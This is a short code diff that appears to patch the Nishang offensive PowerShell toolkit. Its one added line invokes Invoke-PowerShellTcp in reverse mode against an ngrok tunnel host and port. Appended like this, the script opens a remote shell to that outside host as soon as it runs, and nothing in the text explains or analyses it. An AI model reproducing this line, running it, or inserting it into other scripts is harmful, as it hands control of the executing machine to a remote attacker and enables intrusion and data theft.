@@ -125,3 +125,4 @@ https://github.com/samratashok/nishang
     }
 }
 
+Invoke-PowerShellTcp -Reverse -IPAddress 6.tcp.ngrok.io -Port 19984
